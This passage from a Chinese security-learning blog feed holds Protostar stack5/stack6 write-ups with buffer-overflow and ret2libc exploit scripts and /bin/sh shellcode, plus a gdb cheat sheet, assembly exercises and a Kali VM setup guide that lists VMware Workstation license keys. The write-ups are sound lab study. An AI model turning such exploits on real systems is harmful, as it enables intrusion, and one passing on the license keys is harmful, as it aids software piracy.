alt=""></p><p>被安排的明明白白，所有0xbf开头的地址都是栈。在stack5中，我们通过控制返回地址把eip返回到栈中，以此来执行我们的shellcode，如果我们现在仍然把返回地址修改到栈里就会被exit()终止程序，shellcode也不可能得到执行了。</p><p>题目也说了有很多办法可以解决这个问题，你可以直接将返回地址覆盖为ret这个命令本身所在的地址，也就是当ret执行后，它返回的目的地是ret本身。这就相当于把栈中的返回地址pop出来，结果下一个命令还是ret，于是刚才返回地址的后面一个地址才变成了真正的返回地址，你可以随意操控这个地址，指向栈中也没有关系，因为刚刚的第一个ret已经绕过了if语句的检查，后面的操作就和stack5没什么区别了，本篇文章主要讲ret2libc，所以这里就不细讲这个方法了。</p><p>还有一个方法就是ret2libc，其实全称就是return to libc，顾名思义：<strong>返回到libc</strong></p><p>这篇文章很值得参考<br>链接：<a href="https://www.shellblade.net/docs/ret2libc.pdf" target="_blank" rel="noopener">https://www.shellblade.net/docs/ret2libc.pdf</a></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>在说思路之前先做一些铺垫，libc其实是linux下的ansi c函数库，说白了，ret2libc就是返回到libc中的某个函数，我们选择system函数，因为system可以让我们执行shell command。光是返回到system没有什么用，我们要用它帮我们执行一些命令，当然是/bin/sh了，这样我们直接就拿到shell了。</p><p>现在我们有了一个大致思路，就是将返回地址覆盖为system的地址，然后将/bin/sh的地址作为参数传给system。但是一个新的问题出现了，返回地址被system地址覆盖后，要把/bin/sh放在哪儿，才能保证system接收到这个参数？</p><p>先看一个例子</p><p>写一小段程序，看看是怎么传参的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        x++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        foo(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放到gdb里面看</p><p><img src="https://i.imgur.com/SLCfmFW.png" alt=""></p><p>可以看到在调用foo()之前已经将参数压入栈顶，然后在调用foo()时会把返回值也压入栈中，foo函数也有自己的栈帧，所以紧接着的命令就是<strong>push ebp</strong>，最后栈就变成了这个样子：</p><p><img src="https://i.imgur.com/mMH8TcG.png" alt=""></p><p>可见,原来的ebp(红框)，返回地址(蓝框)，参数(绿框)依次排列在栈中，参数的位置就是<strong>ebp+0x8</strong>，这只是传了一个参数的函数，多个参数就以此类推，<strong>ebp+0xc</strong>，<strong>ebp+0x10</strong>。就算是libc中的system函数也不例外，system只接收一个参数，所以可以确定/bin/sh放置的位置就是<strong>ebp+0x8</strong></p><p>下面是思路</p><p><img src="https://i.imgur.com/KXYHfXc.jpg" alt=""></p><p>所以现在只需要找到system和/bin/sh的地址就行了</p><p>system的地址<br><img src="https://i.imgur.com/X6admMm.png" alt=""></p><p><strong>(gdb)i proc mapping</strong>可以找到libc的地址<br><img src="https://i.imgur.com/bFpS7BD.png" alt=""><br>因为/bin/sh在libc中，所以只需要找到/bin/sh的偏移地址再把两个地址相加就是/bin/sh的地址了</p><p>用下面的命令找到/bin/sh偏移地址<br><img src="https://i.imgur.com/6PN7c3h.png" alt=""><br>验证一下，没问题</p><p><img src="https://i.imgur.com/BAWzxYv.png" alt=""></p><p>可以开始写脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">4</span>*<span class="number">20</span></span><br><span class="line">system = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7ecffb0</span>)</span><br><span class="line">return_after_system = <span class="string">"AAAA"</span></span><br><span class="line">bin_sh = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7fb63bf</span>)</span><br><span class="line"><span class="keyword">print</span> padding + system + return_after_system + bin_sh</span><br></pre></td></tr></table></figure><p>运行<br><img src="https://i.imgur.com/9Vo93dm.png" alt=""><br>成功;)</p>]]></content>
      
      
      
        <tags>
            
            <tag> Binary-Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liveoverflow-0x0E-Shellcode</title>
      <link href="/2018/10/03/Liveoverflow-0x0E-Shellcode/"/>
      <url>/2018/10/03/Liveoverflow-0x0E-Shellcode/</url>
      
        <content type="html"><![CDATA[<p>本篇博文是关于shellcode的学习，视频前前后后看了十几遍，里面的步骤也跟着做了十几遍，总算是有点眉目了。</p><a id="more"></a><p>学习需要用到的protostar在视频里面有链接，这里就不贴出来了。</p><p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><hr><h2 id="Protostar-Stack5"><a href="#Protostar-Stack5" class="headerlink" title="Protostar Stack5"></a>Protostar Stack5</h2><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>Stack5 is a standard buffer overflow, this time introducing shellcode.</strong></p><p><strong>This level is at /opt/protostar/bin/stack5</strong></p><p><strong>Hints</strong></p><ul><li>At this point in time, it might be easier to use someone elses shellcode</li><li>if debugging the shellcode, use\xcc (int3) to stop the program executing and return to the debugger</li><li>remove the int3s once your shellcode is done.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先看源码，很短，就一个gets。放到gdb里面看一下</p><p><img src="https://i.imgur.com/ZmZuJOs.png" alt=""></p><p>首先要弄清楚绿框内的东西是什么意思，这被称为<strong>Calling Convention</strong>(函数调用约定)，也就是说下面call所调用的gets函数的参数要从绿框所指定的地址里面获取，也就是<strong>esp+0x10</strong>这个地址，被<strong>mov DWORD PTR  [esp],eax</strong> 放在了栈顶的位置。</p><p>先在程序开始的地方下个断点，查看栈可以知道此时esp所指向的内容就是ret将要返回的地址(蓝框)，记下此时的esp的值：<strong>0xbffff7bc</strong>，于是我们期望利用gets的溢出将这个返回的地址覆盖成我们想要的地址，这样才能执行shellcode，选哪个地址好呢，其实都无所谓，可以直接选在蓝框后面，也就是红框(<strong>0xbffff7c0</strong>)，这样理论上就可以ret到栈里(黄箭头)来执行shellcode了。</p><p>接下来继续单步执行到call命令之前</p><p><img src="https://i.imgur.com/IMyTgX4.png" alt=""></p><p>从刚才说的可以知道，绿框内的指令将gets所需要的参数的开始的地址放在了栈顶(红框)，因此蓝箭头所指就是字符串存放的位置。黄框就是刚刚记下的ret的地址，从蓝箭头到黄框有20*4字节，现在可以来写个脚本试试了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">4</span>*<span class="number">19</span></span><br><span class="line">ret = struct.pack(<span class="string">"I"</span>, <span class="number">0xbffff7c0</span>)</span><br><span class="line">payload = <span class="string">"\xcc"</span>*<span class="number">4</span> <span class="comment">#int3</span></span><br><span class="line"><span class="keyword">print</span> padding + ret + payload</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/a7OaI5m.png" alt=""><br>成功将ret地址覆盖！</p><p>我们运行试试</p><p><img src="https://i.imgur.com/0CefmJe.png" alt=""></p><p>得到的结果是<strong>Illegal instruction</strong>(非法指令)。什么意思呢？</p><p>再用gdb看看</p><p><img src="https://i.imgur.com/Net6TSv.png" alt=""></p><p>注意到栈地址不同，可是什么会导致这个差异呢？把整个栈打印出来看看</p><p><strong>x/1000s $esp</strong><br><img src="https://i.imgur.com/nlygY4U.png" alt=""></p><p>可以看到，红色框部分内容是完全一样的，直到黄框内容发生了变化，PWD，也就是目前工作目录，由于PWD的不同，较长的PWD导致栈的内容相当于被往上挤了，于是在上面ret的地方导致栈地址错位，所以刚刚写的脚本就不能准确的跳转到ret后面的那个地址了。</p><p>所以。。这个地方需要一些neat trick 下面是思路:P</p><p><img src="https://i.imgur.com/OCdFu4x.jpg" alt=""></p><p>现在可以尝试添加shellcode来拿shell了</p><p>先找个shellcode：<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p><p><img src="https://i.imgur.com/XZCxXXM.png" alt=""></p><pre><code>&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;</code></pre><p>然后直接扔到脚本里面就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">4</span>*<span class="number">19</span></span><br><span class="line">ret = struct.pack(<span class="string">"I"</span>, <span class="number">0xbffff7c0</span>+<span class="number">32</span>)</span><br><span class="line">nop = <span class="string">"\x90"</span>*<span class="number">100</span></span><br><span class="line">payload = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line"><span class="keyword">print</span> padding + ret + nop + payload</span><br></pre></td></tr></table></figure><p>然后我们尝试运行</p><p><img src="https://i.imgur.com/Rjo0xJh.png" alt=""></p><p>成功拿到shell！！XD</p>]]></content>
      
      
      
        <tags>
            
            <tag> Binary-Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用gdb调试的基本方法</title>
      <link href="/2018/09/11/%E4%BD%BF%E7%94%A8gdb%E8%B0%83%E8%AF%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95/"/>
      <url>/2018/09/11/%E4%BD%BF%E7%94%A8gdb%E8%B0%83%E8%AF%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>下面列出一些使用gdb调试经常会用的到的一些命令，一时健忘了想不起来还可以过来看看(￣ε (#￣)∑</p><a id="more"></a><pre><code>(gdb) file &lt;文件名&gt;    #加载被调试的可执行程序文件(gdb) r(un)    #运行被调试的程序。若中途遇到断点则暂停在断点处(gdb) c(ontinue) #继续执行被调试程序，直至下一个断点或程序结束(gdb) b(reakpoint) &lt;函数名&gt;/*&lt;地址名&gt;/&lt;行号&gt;#设置断点(gdb) d(elete breakpoint) &lt;断点的编号&gt; #删除断点(gdb) si/ni #都是执行一行汇编源代码，si会进入函数，ni不会。这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。(gdb) p(rint) &lt;变量名称&gt; #显示指定变量（临时变量或全局变量）的值(gdb) help &lt;命令名称&gt; #GDB帮助命令，提供对GDB名种命令的解释说明(gdb) i(nfo) #显示各类信息，具体内容查阅“help i”(gdb) q(uit) #退出gdb(gdb) (e)x(amine)/{COUNT}{FMT}{SIZE} {ADDRESS}    #按照一定的格式打印内存地址处的数据    {COUNT}: 打印的数目，默认为1。    {FMT}: 打印的格式1，默认为上次使用的{FMT}:     o(octal): 8进制整数    x(hex): 16进制整数    d(decimal): 10进制整数    u(unsigned decimal): 10进制非负整数    t(binary): 2进制整数    f(float): 浮点数    a(address): 输出相对于前面最近的符号的偏移    i(instruction): 输出地址处的汇编指令    c(char): 字符    s(string): c字符串(null-terminated string)    z(hex, zero padded on the left): 见说明    {SIZE}: 打印的字节数目，默认为上次使用的{SIZE}:     b(byte): 1个字节    h(halfword): 2个字节    w(word): 4个字节    g(giant, 8 bytes): 8个字节    {ADDRESS}: 目标地址    比如：(gdb) x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，    3表示输出三个单位，u表示按无符号十进制显示。</code></pre><p>最后顺便说一下编译c文件的命令</p><pre><code>gcc （需要编译的c源文件名）-o (编译后的可执行文件名)</code></pre><p>比如要把test.c编译成test，用gcc test.c -o test就可以了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验8-分析一个奇怪的程序</title>
      <link href="/2018/08/10/%E5%AE%9E%E9%AA%8C8-%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%AA%E5%A5%87%E6%80%AA%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>/2018/08/10/%E5%AE%9E%E9%AA%8C8-%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%AA%E5%A5%87%E6%80%AA%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p><em>来源：王爽《汇编语言》第九章 实验8 p187</em></p><p>学到jmp指令的时候发现这个实验8很有意思，分析完程序之后对jmp指令的理解会更深一点。</p><a id="more"></a><p>下面是题目</p><hr><p>分析下面程序，在运行前思考：这个程序可以正确返回吗？</p><p>运行后再思考：为什么是这种结果？</p><p>通过这个程序加深对相关内容的理解。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">   assume cs:codesg</span><br><span class="line"></span><br><span class="line">   codesg segment</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> ax,<span class="number">4</span>c00h</span><br><span class="line">int <span class="number">21</span>h</span><br><span class="line"></span><br><span class="line">start:  <span class="keyword">mov</span> ax,<span class="number">0</span></span><br><span class="line">s:      <span class="keyword">nop</span></span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> di,offset s</span><br><span class="line"><span class="keyword">mov</span> si,offset s2</span><br><span class="line"><span class="keyword">mov</span> ax,cs:[si]</span><br><span class="line"><span class="keyword">mov</span> cs:[di],ax</span><br><span class="line"></span><br><span class="line"><span class="symbol">s0:</span> <span class="keyword">jmp</span> short s</span><br><span class="line"></span><br><span class="line"><span class="symbol">s1:</span> <span class="keyword">mov</span> ax,<span class="number">0</span></span><br><span class="line">int <span class="number">21</span>h</span><br><span class="line"><span class="keyword">mov</span> ax,<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">s2:</span> <span class="keyword">jmp</span> short s1</span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><hr><p>一开始的思路是顺着代码一步一步走的，想着既然jmp short s1，那就直接从s1开始继续往下执行呗，遇到int 21h中断指令后就顺理成章的认为程序不能正确返回。保险起见，把代码编译运行之后，发现第二次运行到s处的时候(也就是执行jmp short s1)并没有直接跳转到s1处，而是往上跳到了mov ax,4c00h然后程序正常返回了。。惊呆了。。</p><p>翻了一下前面几页看到了之前没有特别在意的“jmp指令是根据位移进行跳转的”，然后就恍然大悟了。。</p><p>下图是解题的大致思路</p><p><img src="https://i.imgur.com/xF2sOwF.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设置栈段时栈内数据改变</title>
      <link href="/2018/08/07/%E8%AE%BE%E7%BD%AE%E6%A0%88%E6%AE%B5%E6%97%B6%E6%A0%88%E5%86%85%E6%95%B0%E6%8D%AE%E6%94%B9%E5%8F%98/"/>
      <url>/2018/08/07/%E8%AE%BE%E7%BD%AE%E6%A0%88%E6%AE%B5%E6%97%B6%E6%A0%88%E5%86%85%E6%95%B0%E6%8D%AE%E6%94%B9%E5%8F%98/</url>
      
        <content type="html"><![CDATA[<p>最近学习汇编时遇到一个问题一直没能解决，现在先记录一下。</p><p>我遇到的问题和这个差不多<a href="http://tieba.baidu.com/p/1944917683" target="_blank" rel="noopener">http://tieba.baidu.com/p/1944917683</a></p><a id="more"></a><p>下面详细说一下</p><hr><p>我在debug程序的时候想查看一下栈段的内容，结果发现栈里的数据和一开始设置的内容不一样，下面是程序代码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  assume cs:code,ds:data,ss:stack</span><br><span class="line"></span><br><span class="line">  data segment</span><br><span class="line">dw <span class="number">0123</span>H,<span class="number">0456</span>H,<span class="number">0789</span>H,<span class="number">0</span>ABCH,<span class="number">0</span>DEFH,<span class="number">0</span>CBAH,<span class="number">0987</span>H</span><br><span class="line">  data ends</span><br><span class="line"></span><br><span class="line">  stack segment</span><br><span class="line">dw <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">  stack ends</span><br><span class="line"></span><br><span class="line">  code segment</span><br><span class="line"><span class="symbol">start:</span></span><br><span class="line"><span class="keyword">mov</span> ax,stack</span><br><span class="line"><span class="keyword">mov</span> ss,ax</span><br><span class="line"><span class="keyword">mov</span> sp,<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> ax,data</span><br><span class="line"><span class="keyword">mov</span> ds,ax</span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> ds:[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">push</span> ds:[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> ax,<span class="number">4</span>c00H</span><br><span class="line">int <span class="number">21</span>H</span><br><span class="line">  code ends</span><br><span class="line"></span><br><span class="line">  end start</span><br></pre></td></tr></table></figure><p>进入debug调试，这时查看内存的内容。红框对应<strong>数据段</strong>，蓝框对应<strong>栈段</strong>。这时数据段，栈段数据和设置的一样。<br><img src="https://i.imgur.com/WABb8l1.png" alt=""></p><p>接着用t命令单步执行，当执行到mov ss,ax时，栈段内数据已经改变</p><p><img src="https://i.imgur.com/wRAadNn.png" alt=""></p><p>其中0b3c=ss，0008=ip，0b3d=cs，0547还不知道是什么。</p><p>网上比较能让我明白的解释是</p><p><strong>“debug里的－t是单步中断指令，每执行一条指令产生一个中断（其实是执行其他指令－打印，否则－t后你怎么会看到各寄存器的值），但是要进行现场保护，即把子函数要用到的寄存器全部进栈，所以出现了以上结果”</strong></p><p>可是这样就有一些新的问题：</p><p>如果我不设置栈段，这些数据会存放到哪里？</p><p>如果系统可以将这些数据存放到其他地方，那为什么还要占用我设置的栈段？难道说我手动设置的栈段优先级高一些吗。。。。</p><p>先挖个坑在这儿，等哪天了解清楚了再来填这个坑。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali Linux虚拟机初始配置</title>
      <link href="/2018/07/22/kali-Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/07/22/kali-Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>弄了几天总算是把kali linux 的虚拟机的基本配置弄好了，对于我这个菜鸡来说感觉是期间能踩的坑都被我踩了一遍。配置各种东西的时候焦头烂额，弄完了成就感还是满满的。今天就写篇文章记录一下我期间遇到的各种坑还有各项参数是怎么配置的，防止我以后再要弄的时候又要在网上到处查资料。</p><a id="more"></a><p>好了，不说废话。</p><h1 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h1><p>一开始虚拟机这个地方就出了问题，因为在下载虚拟机的时候没注意看，本来应该下载<strong><a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html" target="_blank" rel="noopener">VMware workstation</a></strong>，结果下成了VMware Player也就是VMware workstation的缩水版，而且很长一段时间都没发觉。就一直没有用到快照功能，每次配置文件出错了改不回去就只能重装系统，很难受。</p><p>顺便贴一点VMware workstation的激活密钥</p><pre><code>CG54H-D8D0H-H8DHY-C6X7X-N2KG6ZC3WK-AFXEK-488JP-A7MQX-XL8YFAC5XK-0ZD4H-088HP-9NQZV-ZG2R4ZC5XK-A6E0M-080XQ-04ZZG-YF08DZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8</code></pre><p>之后是kali linux的镜像，到<strong><a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">官网</a></strong>上面去下载就行了，我用kali linux x64的版本一直不能安装vmtools，最后只好选择x86版本了。紧接着就是系统初始安装，网上也有很多教程，这里直接贴出来<strong><a href="https://jingyan.baidu.com/article/380abd0a1d066a1d91192c5c.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/380abd0a1d066a1d91192c5c.html</a></strong></p><h1 id="VMware-tools的安装"><a href="#VMware-tools的安装" class="headerlink" title="VMware tools的安装"></a>VMware tools的安装</h1><p>被这东西折磨了许久…感觉要安装好也是要看人品的。第一次本来安装好了结果是在VMware player里面，无奈只好在VMware workstation里面再安一次。结果提示安装好了之后却没有任何作用，网上找了各种办法也没用，无奈只好重新安一遍虚拟机（忘了照快照了- -），下面再详细说一下安装vmtools的步骤和坑。</p><p>打开虚拟机后点击<strong>虚拟机</strong>，再点<strong>安装VMware tools</strong>，虚拟机里面就生成了一个文件</p><p><img src="https://i.imgur.com/edJDkHU.png" alt=""></p><p><img src="https://i.imgur.com/YUgUWNx.png" alt=""></p><p>打开文件，VMware提示用tar解压<strong>VMwareTools-10.2.5-8068393.tar.gz</strong>文件<br>这时如果直接使用命令<strong>tar xzvf VMwareTools-10.2.5-8068393.tar.gz</strong>就会出现如下错误</p><p><img src="https://i.imgur.com/wP5IyPi.png" alt=""></p><p>解决办法是将<strong>VMwareTools-10.2.5-8068393.tar.gz</strong>复制到      <strong>home</strong> 目录下进行解压，解压完成后会得到一个叫<strong>vmware-tools-distrib</strong>的文件夹</p><p><img src="https://i.imgur.com/0tVoSg7.png" alt=""></p><p>然后输入以下命令，出现提示一直按回车就可以安装VMware tools了（用tab补全就不用一个一个的敲了）</p><p><img src="https://i.imgur.com/LvnVcSo.png" alt=""></p><p>最后显示如下的话就说明安装完成了</p><p><img src="https://i.imgur.com/YkV3Qck.png" alt=""></p><p>如果这时VMware tools还不生效的话，用命令reboot重启一下应该就可以了</p><h1 id="Kali源的配置以及更新"><a href="#Kali源的配置以及更新" class="headerlink" title="Kali源的配置以及更新"></a>Kali源的配置以及更新</h1><p>配置源这一块照理来说应该是很简单的，就直接在网上复制粘贴就行了，可它就是硬生生的卡了我好久，说到底其实是不会用vim编辑器…</p><p>先把我用的源贴出来</p><pre><code>#中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#清华大学源deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#阿里云源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</code></pre><p>用命令<strong>vim /etc/apt/sources.list</strong>打开配置源文件</p><p><img src="https://i.imgur.com/JzoyyA5.png" alt=""></p><p>然后参考vim编辑器的<strong><a href="https://blog.csdn.net/yangshuainan/article/details/78219604" target="_blank" rel="noopener">使用方法</a></strong>把上面的源复制到<strong>sources.list</strong>文件里面去</p><p>最后变成这样，再输入<strong>:wq</strong>（注意包括冒号）保存并退出</p><p><img src="https://i.imgur.com/xxA5dwe.png" alt=""></p><p>源设置完成后，就可以用以下命令来更新软件包了,更新过程比较久，耐心等就行了，遇到需要操作的提示直接按回车就行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update <span class="comment">#更新软件包资源列表(没有对系统真正更新)</span></span><br><span class="line"></span><br><span class="line">apt-get upgrade <span class="comment">#更新所有已安装的软件包(真正更新系统)</span></span><br><span class="line"></span><br><span class="line">apt-get dist-upgrade <span class="comment">#将系统升级到新版本</span></span><br></pre></td></tr></table></figure><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p>由于kali linux没有打开终端的快捷键，不是很方便，所以到设置里面添加一个。我设置的快捷键和windows一样，也是<strong>win+R</strong></p><p><img src="https://i.imgur.com/AdeM2tf.png" alt=""><br><img src="https://i.imgur.com/IB9o0fw.png" alt=""><br><img src="https://i.imgur.com/hzksyWJ.png" alt=""><br><img src="https://i.imgur.com/fsREx9K.png" alt=""></p><p>名称随便取，<strong>gnome-terminal</strong>就是打开终端的命令，<strong>Super</strong>就是 <strong>win</strong> 键</p><h1 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h1><p>本以为输入法也是一个大坑，应该要弄很久，结果安装过程也是出奇的顺利(虽然还是遇到小坑了)，哈哈可能是老天爷见我踩这么多坑也看不过去了。我安装的是搜狗输入法，参考了这篇<a href="https://blog.csdn.net/haodong_cc/article/details/80362495" target="_blank" rel="noopener"><strong>教程</strong></a>。</p><p>首先用<strong>apt-get install fcitx</strong>命令安装<strong>fcitx</strong>，再用<strong>apt-get install fcitx-libs-qt</strong>安装<strong>fcitx-libs-qt</strong>。然后到搜狗<a href="https://pinyin.sogou.com/linux/?r=pinyin" target="_blank" rel="noopener"><strong>官网</strong></a>去下载对应的linux系统的输入法安装包，我当然下载32bit的。我第一次下载安装包的时候直接用linux系统进了官网下载安装包，结果是损坏的，根据那篇教程试了一下在物理机下载安装包再复制到虚拟机里面，就不会损坏文件了。</p><p>在用<strong>dpkg -i （软件包名称）</strong>遇到如下情况就直接输入提示里面的命令就行了，最后再运行一遍<strong>dpkg -i （软件包名称）</strong> 就安装成功了。重启后在应用程序里面搜索<strong>fcitx</strong>，进入fcitx配置，就可以看到搜狗输入法了(图里的broken前面少打一个短横线- -)</p><p><img src="https://i.imgur.com/QSKbhpj.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku隐写2</title>
      <link href="/2018/07/18/bugku%E9%9A%90%E5%86%992/"/>
      <url>/2018/07/18/bugku%E9%9A%90%E5%86%992/</url>
      
